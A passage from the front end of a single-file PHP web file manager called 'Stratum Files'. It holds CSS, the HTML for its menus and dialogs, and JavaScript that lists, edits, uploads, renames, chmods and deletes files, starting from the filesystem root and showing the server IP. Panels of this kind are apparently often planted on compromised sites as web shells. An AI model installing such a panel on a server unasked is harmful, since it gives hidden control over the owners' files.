  border-radius:12px;padding:.625rem 1rem;
  display:flex;align-items:center;gap:.75rem;
  box-shadow:var(--sh-lg);z-index:99;
  transition:transform .4s var(--ease);
  white-space:nowrap;
}
.sel-bar.visible{transform:translateX(-50%) translateY(0);}
.sel-count{font-family:var(--f-code);font-size:11px;font-weight:500;color:var(--ink-2);}
.sel-divider{width:1px;height:16px;background:var(--border);}

/* ── RESPONSIVE ──────────────────────────────────────── */
@media(max-width:640px){
  .nav{padding:0 .75rem;gap:.5rem;}
  .nav-badge,.search-kbd{display:none;}
  .search-wrap{max-width:none;}
  .subbar{padding:0 .75rem;}
  .file-pane{padding:.75rem;}
  .file-grid{grid-template-columns:repeat(2,1fr);gap:.625rem;}
  .info-chip.hide-mob{display:none;}
  .sort-select{display:none;}
  .fab-wrap{bottom:.875rem;right:.875rem;}
  .toast-wrap{top:calc(var(--nav-h) + var(--sub-h) + .5rem);right:.625rem;}
}
@media(max-width:400px){
  .file-grid{grid-template-columns:repeat(2,1fr);}
}
</style>
</head>
<body>

<!-- ── NAV ─────────────────────────────────────────────── -->
<nav class="nav">
  <div class="nav-brand">
    <div class="nav-icon">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
        <rect x="1" y="1" width="5" height="5" rx="1.5" fill="white"/>
        <rect x="7" y="1" width="5" height="5" rx="1.5" fill="white" opacity=".5"/>
        <rect x="1" y="7" width="5" height="5" rx="1.5" fill="white" opacity=".5"/>
        <rect x="7" y="7" width="5" height="5" rx="1.5" fill="white" opacity=".25"/>
      </svg>
    </div>
    <span class="nav-name">Stratum<span>.</span></span>
    <span class="nav-badge">Files</span>
  </div>

  <div class="search-wrap">
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style="color:var(--ink-4);flex-shrink:0">
      <circle cx="5" cy="5" r="3.5" stroke="currentColor" stroke-width="1.25"/>
      <path d="M8 8L10.5 10.5" stroke="currentColor" stroke-width="1.25" stroke-linecap="round"/>
    </svg>
    <input id="searchInput" placeholder="Filter files…" autocomplete="off">
    <span class="search-kbd">/</span>
  </div>

  <div class="nav-actions">
    <button class="nav-btn" onclick="refresh()" title="Refresh (R)">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none" id="refreshIcon">
        <path d="M10.5 2.5C9.3 1.3 7.6.8 5.8 1.2A5 5 0 0 0 1.2 6.3" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
        <path d="M2.5 10.5C3.7 11.7 5.4 12.2 7.2 11.8A5 5 0 0 0 11.8 6.7" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
        <path d="M8 2.5H10.5V0M5 10.5H2.5V13" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
      <span class="hide-sm" style="display:none">Refresh</span>
    </button>
    <button class="nav-btn primary" onclick="openUploadModal()" title="Upload (U)">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
        <path d="M6.5 1V9M3 4.5L6.5 1L10 4.5" stroke="white" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M1.5 10.5V11.5C1.5 12 1.8 12.5 2.5 12.5H10.5C11.2 12.5 11.5 12 11.5 11.5V10.5" stroke="white" stroke-width="1.3" stroke-linecap="round"/>
      </svg>
      <span>Upload</span>
    </button>
    <a href="?logout" class="nav-btn icon-only danger" title="Logout">
      <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
        <path d="M9 2H11.5C12 2 12.5 2.5 12.5 3V11C12.5 11.5 12 12 11.5 12H9" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
        <path d="M6 9.5L9 7L6 4.5M9 7H1.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </a>
  </div>

  <div class="nav-trail">
    <div class="nav-trail-fill" id="navTrail"></div>
  </div>
</nav>

<!-- ── SUBBAR ───────────────────────────────────────────── -->
<div class="subbar">
  <div class="subbar-left">
    <div id="breadcrumbs" class="breadcrumb"></div>
  </div>
  <div class="subbar-right">
    <div class="info-chip hide-mob" id="serverChip">
      <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="2" width="8" height="3" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x="1" y="6" width="8" height="2" rx="1" stroke="currentColor" stroke-width="1.1"/><circle cx="8" cy="3.5" r=".5" fill="currentColor"/></svg>
      <span><?php echo htmlspecialchars($_SERVER['SERVER_ADDR']); ?></span>
    </div>
    <select class="sort-select" id="sortSelect" onchange="applySort()">
      <option value="name-asc">Name A→Z</option>
      <option value="name-desc">Name Z→A</option>
      <option value="size-asc">Size ↑</option>
      <option value="size-desc">Size ↓</option>
      <option value="mod-desc">Newest</option>
      <option value="mod-asc">Oldest</option>
    </select>
    <div class="view-toggle">
      <button class="vt-btn active" id="viewGrid" onclick="setView('grid')" title="Grid view">
        <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><rect x=".5" y=".5" width="4" height="4" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x="6.5" y=".5" width="4" height="4" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x=".5" y="6.5" width="4" height="4" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x="6.5" y="6.5" width="4" height="4" rx="1" stroke="currentColor" stroke-width="1.1"/></svg>
      </button>
      <button class="vt-btn" id="viewList" onclick="setView('list')" title="List view">
        <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M3 2.5H10M3 5.5H10M3 8.5H10M1.5 2.5H1.5M1.5 5.5H1.5M1.5 8.5H1.5" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
      </button>
    </div>
    <div class="info-chip" id="itemCount" style="font-family:var(--f-code);font-size:9.5px;color:var(--ink-3);">—</div>
  </div>
</div>

<!-- ── WORKSPACE ────────────────────────────────────────── -->
<div class="workspace">
  <div class="file-pane" id="filePane">
    <div id="fileContent"></div>
  </div>
</div>

<!-- ── CONTEXT MENU ─────────────────────────────────────── -->
<div class="ctx" id="ctxMenu">
  <div class="ctx-section">
    <button class="ctx-item" onclick="ctxAction('open')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M1 2.5C1 1.7 1.7 1 2.5 1H8L12 5V10.5C12 11.3 11.3 12 10.5 12H2.5C1.7 12 1 11.3 1 10.5V2.5Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M7.5 1V5.5H12" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/></svg>
      Open / Edit
    </button>
    <button class="ctx-item" onclick="ctxAction('rename')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M8 2L11 5L4.5 11.5L1 12L1.5 8.5L8 2Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/></svg>
      Rename
    </button>
    <button class="ctx-item" onclick="ctxAction('copy')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><rect x="4" y="4" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M1 9V2.5C1 1.7 1.7 1 2.5 1H9" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
      Copy
      <span class="ctx-shortcut">⌘C</span>
    </button>
    <button class="ctx-item" onclick="ctxAction('cut')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><circle cx="3.5" cy="9.5" r="2" stroke="currentColor" stroke-width="1.2"/><circle cx="9.5" cy="9.5" r="2" stroke="currentColor" stroke-width="1.2"/><path d="M4.5 1L11 9M1 1L9 10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
      Cut
      <span class="ctx-shortcut">⌘X</span>
    </button>
  </div>
  <div class="ctx-sep"></div>
  <div class="ctx-section">
    <button class="ctx-item" onclick="ctxAction('download')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M6.5 1V9M3 6.5L6.5 9.5L10 6.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/><path d="M1 11H12" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
      Download
    </button>
    <button class="ctx-item" onclick="ctxAction('zip')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M1.5 3.5L2.5 1H10.5L11.5 3.5V11.5C11.5 11.8 11.2 12 11 12H2C1.8 12 1.5 11.8 1.5 11.5V3.5Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M5 5V12M8 5V12M5 5H8M5 8H8" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>
      Compress
    </button>
    <button class="ctx-item" id="ctxUnzip" onclick="ctxAction('unzip')" style="display:none">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M1.5 3.5L2.5 1H10.5L11.5 3.5V11.5C11.5 11.8 11.2 12 11 12H2C1.8 12 1.5 11.8 1.5 11.5V3.5Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M6.5 5.5V9M4.5 7L6.5 9L8.5 7" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Extract
    </button>
    <button class="ctx-item" onclick="ctxAction('chmod')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M6.5 1L12 3.5V6C12 9 9 11.5 6.5 12C4 11.5 1 9 1 6V3.5L6.5 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/></svg>
      Permissions
    </button>
  </div>
  <div class="ctx-sep"></div>
  <div class="ctx-section">
    <button class="ctx-item ctx-danger" onclick="ctxAction('delete')">
      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M1.5 3.5H11.5M4.5 3.5V2.5C4.5 2 4.8 1.5 5.5 1.5H7.5C8.2 1.5 8.5 2 8.5 2.5V3.5M5 5.5V9.5M8 5.5V9.5M2.5 3.5L3 11.5H10L10.5 3.5" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Delete
      <span class="ctx-shortcut" style="color:var(--red);opacity:.6;">⌫</span>
    </button>
  </div>
</div>

<!-- ── EDITOR ────────────────────────────────────────────── -->
<div class="editor-modal hidden" id="editorModal">
  <div class="editor-topbar">
    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" style="color:var(--ink-3);flex-shrink:0">
      <path d="M1.5 3C1.5 2.2 2.2 1.5 3 1.5H9.5L12.5 4.5V11C12.5 11.8 11.8 12.5 11 12.5H3C2.2 12.5 1.5 11.8 1.5 11V3Z" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/>
      <path d="M9 1.5V5H12.5" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/>
    </svg>
    <div class="editor-filename">
      <span id="editFileName">file.php</span>
      <div class="editor-modified hidden" id="editorDot"></div>
    </div>
    <div class="editor-status">
      <span class="editor-lang" id="editorLang">PHP</span>
      <span class="editor-lines" id="editorLines">1 line</span>
    </div>
    <div style="display:flex;gap:.5rem;margin-left:.5rem;">
      <button class="btn btn-ghost btn-sm" onclick="closeEditor()">Discard</button>
      <button class="btn btn-blue btn-sm" onclick="saveFile()">
        <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 7.5V9C1.5 9.3 1.7 9.5 2 9.5H9C9.3 9.5 9.5 9.3 9.5 9V7.5M5.5 1V7M3 4.5L5.5 7L8 4.5" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        Save
      </button>
    </div>
  </div>
  <div id="aceEditor" style="flex:1;width:100%;"></div>
</div>

<!-- ── UPLOAD MODAL ──────────────────────────────────────── -->
<div class="modal-backdrop hidden" id="uploadModal">
  <div class="modal" style="max-width:420px;">
    <div class="modal-head">
      <span class="modal-title">Upload Files</span>
      <button class="modal-close" onclick="closeModal('uploadModal')">
        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 2L10 10M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
      </button>
    </div>
    <div class="modal-body">
      <div class="dropzone" id="dropZone">
        <div class="dropzone-icon">
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M10 3V14M5 8L10 3L15 8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 16H17" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
        </div>
        <div class="dropzone-title">Drop files here</div>
        <div class="dropzone-sub">or click to browse from your device</div>
        <input type="file" id="fileInput" multiple style="display:none" onchange="handleUpload(this.files)">
      </div>
      <div class="upload-file-list" id="uploadFileList"></div>
    </div>
    <div class="modal-foot">
      <button class="btn btn-ghost" onclick="closeModal('uploadModal')">Cancel</button>
      <button class="btn btn-primary" id="uploadConfirmBtn" onclick="doUpload()" disabled>Upload</button>
    </div>
  </div>
</div>

<!-- ── INPUT MODAL ───────────────────────────────────────── -->
<div class="modal-backdrop hidden" id="inputModal">
  <div class="modal" style="max-width:380px;">
    <div class="modal-head">
      <span class="modal-title" id="inputModalTitle">Input</span>
      <button class="modal-close" onclick="closeModal('inputModal')">
        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 2L10 10M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
      </button>
    </div>
    <div class="modal-body">
      <div class="form-field">
        <label class="form-label" id="inputModalLabel">Value</label>
        <input class="form-input" type="text" id="inputVal" autocomplete="off">
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn btn-ghost" onclick="closeModal('inputModal')">Cancel</button>
      <button class="btn btn-primary" id="inputConfirmBtn">Confirm</button>
    </div>
  </div>
</div>

<!-- ── DELETE CONFIRM MODAL ──────────────────────────────── -->
<div class="modal-backdrop hidden" id="deleteModal">
  <div class="modal" style="max-width:360px;">
    <div class="modal-head">
      <span class="modal-title">Delete Item</span>
      <button class="modal-close" onclick="closeModal('deleteModal')">
        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 2L10 10M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
      </button>
    </div>
    <div class="modal-body">
      <p style="font-size:13px;color:var(--ink-2);line-height:1.6;">Are you sure you want to permanently delete <strong id="deleteItemName" style="color:var(--ink);"></strong>? This cannot be undone.</p>
    </div>
    <div class="modal-foot">
      <button class="btn btn-ghost" onclick="closeModal('deleteModal')">Cancel</button>
      <button class="btn btn-red" id="deleteConfirmBtn">Delete</button>
    </div>
  </div>
</div>

<!-- ── CLIPBOARD BAR ─────────────────────────────────────── -->
<div class="clipboard-bar" id="clipboardBar">
  <div class="clipboard-bar-label">
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="3.5" y="3.5" width="7" height="7" rx="1" stroke="rgba(255,255,255,.6)" stroke-width="1.15"/><path d="M1 8.5V2C1 1.4 1.4 1 2 1H8.5" stroke="rgba(255,255,255,.6)" stroke-width="1.15" stroke-linecap="round"/></svg>
    <span id="clipType">Copied</span>:
  </div>
  <span class="clipboard-bar-name" id="clipName">file.txt</span>
  <button class="btn btn-blue btn-sm" onclick="pasteItem()">Paste here</button>
  <button style="color:rgba(255,255,255,.5);padding:.25rem;" onclick="clearClipboard()">
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 2L10 10M10 2L2 10" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
  </button>
</div>

<!-- ── SELECTION BAR ─────────────────────────────────────── -->
<div class="sel-bar" id="selBar">
  <span class="sel-count" id="selCount">0 selected</span>
  <div class="sel-divider"></div>
  <button class="btn btn-ghost btn-sm" onclick="selAction('copy')">Copy</button>
  <button class="btn btn-ghost btn-sm" onclick="selAction('zip')">Compress</button>
  <button class="btn btn-red btn-sm" onclick="selAction('delete')">Delete</button>
  <div class="sel-divider"></div>
  <button class="btn btn-ghost btn-sm" onclick="clearSelection()">
    <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 1.5L8.5 8.5M8.5 1.5L1.5 8.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
  </button>
</div>

<!-- ── FAB ───────────────────────────────────────────────── -->
<div class="fab-wrap">
  <button class="fab" id="fabMain" onclick="toggleFab()" title="Create">
    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 3V15M3 9H15" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
  </button>
  <div class="fab-menu" id="fabMenu">
    <button class="fab-sub" onclick="showCreateFolder(); toggleFab()">
      <div class="fab-sub-icon" style="background:var(--amber-bg);">
        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1.5 4C1.5 3.2 2.2 2.5 3 2.5H5.5L7 4H11C11.8 4 12.5 4.7 12.5 5.5V10.5C12.5 11.3 11.8 12 11 12H3C2.2 12 1.5 11.3 1.5 10.5V4Z" stroke="var(--amber)" stroke-width="1.25" stroke-linejoin="round"/></svg>
      </div>
      New Folder
    </button>
    <button class="fab-sub" onclick="showCreateFile(); toggleFab()">
      <div class="fab-sub-icon" style="background:var(--blue-bg);">
        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2.5 3C2.5 2.2 3.2 1.5 4 1.5H9L11.5 4V11C11.5 11.8 10.8 12.5 10 12.5H4C3.2 12.5 2.5 11.8 2.5 11V3Z" stroke="var(--blue)" stroke-width="1.25" stroke-linejoin="round"/><path d="M9 1.5V4.5H11.5" stroke="var(--blue)" stroke-width="1.25" stroke-linejoin="round"/></svg>
      </div>
      New File
    </button>
    <button class="fab-sub" onclick="openUploadModal(); toggleFab()">
      <div class="fab-sub-icon" style="background:var(--green-bg);">
        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 2V9M4 5.5L7 2.5L10 5.5" stroke="var(--green)" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/><path d="M2 11H12" stroke="var(--green)" stroke-width="1.3" stroke-linecap="round"/></svg>
      </div>
      Upload
    </button>
  </div>
</div>

<!-- ── TOAST WRAP ────────────────────────────────────────── -->
<div class="toast-wrap" id="toastWrap"></div>

<script>
/* ── INIT ───────────────────────────────────────────────── */
let curPath  = '<?php echo addslashes($dir); ?>';
let selItems = new Set();
let selectedItem = null;
let curData  = null;
let viewMode = 'grid';
let sortMode = 'name-asc';
let pendingUploadFiles = null;
let fabOpen  = false;

const editor = ace.edit("aceEditor");
editor.setTheme("ace/theme/github");
editor.session.setMode("ace/mode/php");
editor.setOptions({ fontSize:'13px', showPrintMargin:false, wrap:true, tabSize:2 });
editor.on('change', () => {
  document.getElementById('editorDot').classList.remove('hidden');
  const lines = editor.session.getLength();
  document.getElementById('editorLines').textContent = lines + ' line' + (lines!==1?'s':'');
});

/* ── FILE TYPE ICONS ────────────────────────────────────── */
const extIcons = {
  dir:  { cls:'ic-dir',  svg:'<path d="M1.5 4C1.5 3.2 2.2 2.5 3 2.5H5.5L7 4H11C11.8 4 12.5 4.7 12.5 5.5V10.5C12.5 11.3 11.8 12 11 12H3C2.2 12 1.5 11.3 1.5 10.5V4Z" stroke="currentColor" stroke-width="1.3" stroke-linejoin="round"/>' },
  php:  { cls:'ic-php',  svg:'<text x="3" y="11" font-size="8" font-weight="600" fill="currentColor" font-family="monospace">php</text>' },
  js:   { cls:'ic-js',   svg:'<text x="3.5" y="11" font-size="8" font-weight="600" fill="currentColor" font-family="monospace">js</text>' },
  html: { cls:'ic-html', svg:'<text x="1.5" y="11" font-size="7" font-weight="600" fill="currentColor" font-family="monospace">html</text>' },
  css:  { cls:'ic-css',  svg:'<text x="2.5" y="11" font-size="7.5" font-weight="600" fill="currentColor" font-family="monospace">css</text>' },
  png:  { cls:'ic-img',  svg:'<rect x="2" y="3" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M2 8L4.5 5.5L6.5 7.5L8 6L12 9" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>' },
  jpg:  { cls:'ic-img',  svg:'<rect x="2" y="3" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M2 8L4.5 5.5L6.5 7.5L8 6L12 9" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>' },
  jpeg: { cls:'ic-img',  svg:'<rect x="2" y="3" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M2 8L4.5 5.5L6.5 7.5L8 6L12 9" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>' },
  gif:  { cls:'ic-img',  svg:'<rect x="2" y="3" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M2 8L4.5 5.5L6.5 7.5L8 6L12 9" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>' },
  svg:  { cls:'ic-img',  svg:'<rect x="2" y="3" width="10" height="8" rx="1.5" stroke="currentColor" stroke-width="1.2"/><path d="M2 8L4.5 5.5L6.5 7.5L8 6L12 9" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/>' },
  zip:  { cls:'ic-zip',  svg:'<path d="M2 4.5L3 2H11L12 4.5V11.5C12 11.8 11.8 12 11.5 12H2.5C2.2 12 2 11.8 2 11.5V4.5Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M5.5 5V12M8.5 5V12M5.5 5H8.5M5.5 8H8.5" stroke="currentColor" stroke-width="1" stroke-linecap="round"/>' },
  txt:  { cls:'ic-txt',  svg:'<path d="M1.5 3.5L2.5 1H10.5L11.5 3.5V10.5C11.5 10.8 11.3 11 11 11H2C1.7 11 1.5 10.8 1.5 10.5V3.5Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M4 5H8.5M4 7H7" stroke="currentColor" stroke-width="1" stroke-linecap="round"/>' },
  pdf:  { cls:'ic-txt',  svg:'<text x="2" y="10.5" font-size="7" font-weight="600" fill="currentColor" font-family="monospace">pdf</text>' },
  default:{ cls:'ic-def',svg:'<path d="M2.5 3C2.5 2.2 3.2 1.5 4 1.5H9L11.5 4V11C11.5 11.8 10.8 12.5 10 12.5H4C3.2 12.5 2.5 11.8 2.5 11V3Z" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/><path d="M9 1.5V4.5H11.5" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round"/>' },
};

function getIcon(type) {
  return extIcons[type] || extIcons.default;
}

function iconSvg(type, size=16) {
  const ic = getIcon(type);
  return `<svg width="${size}" height="${size}" viewBox="0 0 14 14" fill="none">${ic.svg}</svg>`;
}

/* ── FETCH / RENDER ─────────────────────────────────────── */
async function fetchList(path, pushHistory=true) {
  setLoading(true);
  animateTrail();
  try {
    const fd = new FormData(); fd.append('path', path);
    const r = await fetch('?action=list', { method:'POST', body:fd });
    const d = await r.json();
    if (d.status === 'success') {
      curPath = d.data.path;
      curData = d.data;
      if (pushHistory) history.pushState({ path:curPath }, '', '?dir=' + encodeURIComponent(curPath));
      render(d.data);
      updateBreadcrumbs(curPath);
      clearSelection();
    } else toast(d.msg, 'err');
  } catch(e) { toast('Network error', 'err'); }
  setLoading(false);
}

function setLoading(on) {
  if (on) {
    document.getElementById('fileContent').innerHTML = `<div class="loader-wrap"><div class="loader"></div><div style="font-family:var(--f-code);font-size:11px;color:var(--ink-4);">Loading…</div></div>`;
  }
}

function animateTrail() {
  const trail = document.getElementById('navTrail');
  trail.style.width = '0%';
  requestAnimationFrame(() => {
    trail.style.width = '100%';
    setTimeout(() => { trail.style.width = '0%'; }, 700);
  });
}

function applySort() {
  sortMode = document.getElementById('sortSelect').value;
  if (curData) render(curData);
}

function sortItems(items) {
  return [...items].sort((a, b) => {
    switch(sortMode) {
      case 'name-asc':  return a.name.localeCompare(b.name);
      case 'name-desc': return b.name.localeCompare(a.name);
      case 'size-asc':  return a.size.localeCompare(b.size);
      case 'size-desc': return b.size.localeCompare(a.size);
      case 'mod-asc':   return a.mod.localeCompare(b.mod);
      case 'mod-desc':  return b.mod.localeCompare(a.mod);
      default: return 0;
    }
  });
}

function render(data) {
  const filter = document.getElementById('searchInput').value.toLowerCase();
  let folders = sortItems(data.folders);
  let files   = sortItems(data.files);
  if (filter) {
    folders = folders.filter(f => f.name.toLowerCase().includes(filter));
    files   = files.filter(f => f.name.toLowerCase().includes(filter));
  }
  const total = folders.length + files.length;
  document.getElementById('itemCount').textContent = total + ' item' + (total!==1?'s':'');

  if (!total) {
    document.getElementById('fileContent').innerHTML = `
      <div class="empty-state">
        <div class="empty-state-icon"><svg width="22" height="22" viewBox="0 0 22 22" fill="none"><path d="M3 6C3 4.9 3.9 4 5 4H9L11 6H17C18.1 6 19 6.9 19 8V17C19 18.1 18.1 19 17 19H5C3.9 19 3 18.1 3 17V6Z" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round"/></svg></div>
        <div class="empty-state-title">Empty directory</div>
        <div class="empty-state-sub">${filter ? 'No files match your filter.' : 'This folder has no files yet.'}</div>
      </div>`;
    return;
  }

  if (viewMode === 'grid') renderGrid(folders, files);
  else renderListView(folders, files);
}

function renderGrid(folders, files) {
  let html = '';
  if (folders.length) {
    html += `<div class="section-label">Folders (${folders.length})</div><div class="file-grid">`;
    folders.forEach((it, idx) => {
      const ic = getIcon('dir');
      const sel = selItems.has(it.path) ? ' selected' : '';
      html += `<div class="file-card${sel}" data-path="${esc(it.path)}" data-type="dir"
        style="animation-delay:${idx*0.03}s"
        onclick="cardClick(event, this)"
        ondblclick="fetchList('${esc(it.path)}')"
        oncontextmenu="openCtx(event,'${esc(it.path)}','dir');return false;">
        <button class="file-card-more" onclick="event.stopPropagation();openCtx(event,'${esc(it.path)}','dir')">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="2.5" r="1" fill="currentColor"/><circle cx="6" cy="6" r="1" fill="currentColor"/><circle cx="6" cy="9.5" r="1" fill="currentColor"/></svg>
        </button>
        <div class="file-icon-wrap ${ic.cls}"><svg width="20" height="20" viewBox="0 0 14 14" fill="none">${ic.svg}</svg></div>
        <div class="file-name">${escHtml(it.name)}</div>
        <div class="file-meta"><span class="file-size">${escHtml(it.size)}</span><span class="file-perm">${it.perm}</span></div>
      </div>`;
    });
    html += `</div>`;
  }
  if (files.length) {
    html += `<div class="section-label" style="margin-top:${folders.length?'.75rem':'0'}">Files (${files.length})</div><div class="file-grid">`;
    files.forEach((it, idx) => {
      const ic = getIcon(it.type);
      const sel = selItems.has(it.path) ? ' selected' : '';
      html += `<div class="file-card${sel}" data-path="${esc(it.path)}" data-type="${esc(it.type)}"
        style="animation-delay:${(folders.length*0.03)+(idx*0.03)}s"
        onclick="cardClick(event, this)"
        ondblclick="editFile('${esc(it.path)}','${escHtml(it.name)}')"
        oncontextmenu="openCtx(event,'${esc(it.path)}','${esc(it.type)}');return false;">
        <button class="file-card-more" onclick="event.stopPropagation();openCtx(event,'${esc(it.path)}','${esc(it.type)}')">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="2.5" r="1" fill="currentColor"/><circle cx="6" cy="6" r="1" fill="currentColor"/><circle cx="6" cy="9.5" r="1" fill="currentColor"/></svg>
        </button>
        <div class="file-icon-wrap ${ic.cls}"><svg width="20" height="20" viewBox="0 0 14 14" fill="none">${ic.svg}</svg></div>
        <div class="file-name">${escHtml(it.name)}</div>
        <div class="file-meta"><span class="file-size">${it.size}</span><span class="file-perm">${it.perm}</span></div>
      </div>`;
    });
    html += `</div>`;
  }
  document.getElementById('fileContent').innerHTML = html;
}

function renderListView(folders, files) {
  const all = [...folders, ...files];
  let rows = all.map((it, idx) => {
    const ic = getIcon(it.type);
    const sel = selItems.has(it.path) ? ' selected' : '';
    const isDir = it.type === 'dir';
    return `<tr class="${sel}" data-path="${esc(it.path)}" data-type="${esc(it.type)}"
      style="animation-delay:${idx*0.02}s"
      onclick="cardClick(event,this)"
      ondblclick="${isDir ? `fetchList('${esc(it.path)}')` : `editFile('${esc(it.path)}','${escHtml(it.name)}')`}"
      oncontextmenu="openCtx(event,'${esc(it.path)}','${esc(it.type)}');return false;">
      <td><div class="list-name">
        <div class="list-icon ${ic.cls}"><svg width="13" height="13" viewBox="0 0 14 14" fill="none">${ic.svg}</svg></div>
        ${escHtml(it.name)}
      </div></td>
      <td class="list-mono">${it.size}</td>
      <td class="list-mono" style="color:var(--ink-4)">${it.mod}</td>
      <td class="list-mono"><span class="file-perm">${it.perm}</span></td>
      <td><div class="list-actions">
        <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();openCtx(event,'${esc(it.path)}','${esc(it.type)}')">
          <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="2" r=".8" fill="currentColor"/><circle cx="5.5" cy="5.5" r=".8" fill="currentColor"/><circle cx="5.5" cy="9" r=".8" fill="currentColor"/></svg>
        </button>
      </div></td>
    </tr>`;
  }).join('');
  document.getElementById('fileContent').innerHTML = `
    <table class="file-list-table">
      <thead><tr>
        <th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th></th>
      </tr></thead>
      <tbody>${rows}</tbody>
    </table>`;
}

/* ── BREADCRUMBS ────────────────────────────────────────── */
function updateBreadcrumbs(path) {
  const parts = path.replace(/\\/g,'/').split('/').filter(Boolean);
  const bc = document.getElementById('breadcrumbs');
  bc.innerHTML = '';
  let build = '';

  const home = document.createElement('span');
  home.className = 'bc-seg' + (parts.length === 0 ? ' current' : '');
  home.innerHTML = `<svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1 5L5.5 1L10 5V10H7V7H4V10H1V5Z" stroke="currentColor" stroke-width="1.15" stroke-linejoin="round"/></svg>`;
  home.onclick = () => fetchList('/');
  bc.appendChild(home);

  parts.forEach((part, idx) => {
    build += '/' + part;
    const sep = document.createElement('span');
